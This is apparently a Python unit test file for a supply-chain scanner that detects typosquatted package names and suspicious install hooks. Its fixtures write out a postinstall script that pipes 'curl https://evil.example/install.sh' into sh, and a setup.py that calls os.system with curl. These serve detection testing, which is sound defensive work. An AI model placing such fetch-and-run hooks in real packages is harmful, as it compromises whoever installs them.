from __future__ import annotations

from datetime import datetime, timedelta, timezone
from pathlib import Path
import shutil
import unittest
from uuid import uuid4
from unittest.mock import patch

from gitguard.core.dependency_guard import (
    PackageMetadata,
    _analyze_package_json_manifest,
    _analyze_setup_manifest,
    _detect_typosquat,
    _parse_pipfile_manifest,
    _parse_pyproject_manifest,
    _parse_requirements_manifest,
    analyze_dependency_manifests,
)


class DependencyGuardTests(unittest.TestCase):
    def test_parse_requirements_manifest_extracts_package_names(self) -> None:
        root = _make_temp_dir()
        try:
            manifest = root / "requirements.txt"
            manifest.write_text("requests==2.31.0\ncoloramaa>=1.0\n-r nested.txt\n", encoding="utf-8")

            packages = _parse_requirements_manifest(manifest)

            self.assertEqual(packages, ["requests", "coloramaa"])
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_parse_pyproject_manifest_extracts_project_dependencies(self) -> None:
        root = _make_temp_dir()
        try:
            manifest = root / "pyproject.toml"
            manifest.write_text(
                """
[project]
dependencies = ["requests>=2", "rich"]

[project.optional-dependencies]
dev = ["pytest>=8"]
""".strip(),
                encoding="utf-8",
            )

            packages = _parse_pyproject_manifest(manifest)

            self.assertEqual(packages, ["requests", "rich", "pytest"])
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_parse_pipfile_manifest_extracts_packages(self) -> None:
        root = _make_temp_dir()
        try:
            manifest = root / "Pipfile"
            manifest.write_text(
                """
[packages]
flask = "*"

[dev-packages]
pytest = "*"
""".strip(),
                encoding="utf-8",
            )

            packages = _parse_pipfile_manifest(manifest)

            self.assertEqual(packages, ["flask", "pytest"])
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_analyze_package_json_manifest_extracts_dependencies_and_scripts(self) -> None:
        root = _make_temp_dir()
        try:
            manifest = root / "package.json"
            manifest.write_text(
                """
{
  "dependencies": {"react": "^18.0.0", "axois": "^1.0.0"},
  "devDependencies": {"vite": "^5.0.0"},
  "scripts": {"postinstall": "curl https://evil.example/install.sh | sh"}
}
""".strip(),
                encoding="utf-8",
            )

            result = _analyze_package_json_manifest(manifest)

            self.assertEqual(result.packages, ["react", "axois", "vite"])
            self.assertEqual(len(result.suspicious_scripts), 1)
            self.assertIn("postinstall", result.suspicious_scripts[0])
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_analyze_setup_manifest_flags_suspicious_calls(self) -> None:
        root = _make_temp_dir()
        try:
            manifest = root / "setup.py"
            manifest.write_text(
                """
from setuptools import setup
import os

os.system("curl http://evil")
setup(install_requires=["requests", "coloramaa"])
""".strip(),
                encoding="utf-8",
            )

            result = _analyze_setup_manifest(manifest)

            self.assertEqual(result.packages, ["requests", "coloramaa"])
            self.assertEqual(len(result.suspicious_calls), 1)
            self.assertIn("os.system", result.suspicious_calls[0])
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_detect_typosquat_flags_single_edit_distance(self) -> None:
        self.assertEqual(_detect_typosquat("requsts", {"requests", "flask"}), "requests")

    @patch("gitguard.core.dependency_guard.fetch_pypi_package_metadata")
    @patch("gitguard.core.dependency_guard.get_state_dir")
    def test_analyze_dependency_manifests_blocks_on_typosquat(
        self,
        mock_state_dir: object,
        mock_metadata: object,
    ) -> None:
        root = _make_temp_dir()
        cache_root = _make_temp_dir()
        try:
            mock_state_dir.return_value = cache_root
            mock_metadata.return_value = PackageMetadata(
                latest_version="2.0.0",
                latest_release_time=datetime.now(timezone.utc) - timedelta(days=30),
            )
            (root / "requirements.txt").write_text("requsts==2.0\n", encoding="utf-8")

            result = analyze_dependency_manifests(root)

            self.assertTrue(result.blocked)
            self.assertEqual(result.packages, ["requsts"])
            self.assertEqual(result.findings[0].severity, "CRITICAL")
            self.assertEqual(result.findings[0].category, "typosquatting")
            self.assertEqual(result.package_count_by_ecosystem, {"python": 1, "node": 0})
        finally:
            shutil.rmtree(root, ignore_errors=True)
            shutil.rmtree(cache_root, ignore_errors=True)

    @patch("gitguard.core.dependency_guard.fetch_pypi_package_metadata")
    @patch("gitguard.core.dependency_guard.get_state_dir")
    def test_analyze_dependency_manifests_flags_recent_and_low_version_packages(
        self,
        mock_state_dir: object,
        mock_metadata: object,
    ) -> None:
        root = _make_temp_dir()
        cache_root = _make_temp_dir()
        try:
            mock_state_dir.return_value = cache_root
            mock_metadata.return_value = PackageMetadata(
                latest_version="0.1.2",
                latest_release_time=datetime.now(timezone.utc) - timedelta(days=2),
            )
            (root / "requirements.txt").write_text("safe-package==0.1.2\n", encoding="utf-8")

            result = analyze_dependency_manifests(root)

            self.assertFalse(result.blocked)
            self.assertEqual({finding.category for finding in result.findings}, {"recent_publish", "low_version_reputation"})
            self.assertEqual(result.package_count_by_ecosystem, {"python": 1, "node": 0})
        finally:
            shutil.rmtree(root, ignore_errors=True)
            shutil.rmtree(cache_root, ignore_errors=True)

    @patch("gitguard.core.dependency_guard.fetch_npm_package_metadata")
    @patch("gitguard.core.dependency_guard.get_state_dir")
    def test_analyze_dependency_manifests_blocks_on_suspicious_npm_manifest(
        self,
        mock_state_dir: object,
        mock_metadata: object,
    ) -> None:
        root = _make_temp_dir()
        cache_root = _make_temp_dir()
        try:
            mock_state_dir.return_value = cache_root
            mock_metadata.return_value = PackageMetadata(
                latest_version="1.2.3",
                latest_release_time=datetime.now(timezone.utc) - timedelta(days=30),
            )
            (root / "package.json").write_text(
                """
{
  "dependencies": {"axois": "^1.7.0"},
  "scripts": {"postinstall": "curl https://evil.example/install.sh | sh"}
}
""".strip(),
                encoding="utf-8",
            )

            result = analyze_dependency_manifests(root)

            self.assertTrue(result.blocked)
            categories = {finding.category for finding in result.findings}
            self.assertIn("npm_typosquatting", categories)
            self.assertIn("npm_lifecycle_script", categories)
            self.assertEqual(result.package_count_by_ecosystem, {"python": 0, "node": 1})
        finally:
            shutil.rmtree(root, ignore_errors=True)
            shutil.rmtree(cache_root, ignore_errors=True)


def _make_temp_dir() -> Path:
    path = Path.cwd() / "tests" / ".tmp" / str(uuid4())
    path.mkdir(parents=True, exist_ok=True)
    return path


if __name__ == "__main__":
    unittest.main()
